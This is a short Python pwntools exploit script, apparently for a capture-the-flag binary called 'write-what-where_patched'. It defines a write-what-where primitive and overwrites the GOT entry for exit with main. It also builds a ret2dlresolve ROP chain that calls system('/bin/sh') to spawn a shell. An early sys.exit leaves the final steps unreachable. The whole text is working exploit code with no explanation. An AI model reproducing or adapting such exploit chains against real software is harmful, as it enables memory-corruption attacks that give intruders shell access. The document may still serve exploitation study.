from pwn import *
import sys

elf = ELF('write-what-where_patched')
libc = ELF('libc.so.6')
context.update(arch='amd64', os='linux', binary=elf)


def write(conn, addr, value):
    conn.recvuntil(b'what?\n')
    conn.send(p32(value))
    conn.recvuntil(b'where?\n')
    conn.send(str(addr).rjust(9, '0').encode())


rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.ret2dlresolve(dlresolve)
payload = rop.chain()
print(rop.dump())
sys.exit(0)

p = elf.process()
write(p, elf.got['exit'], elf.symbols['main'])

p.interactive()

p.close()
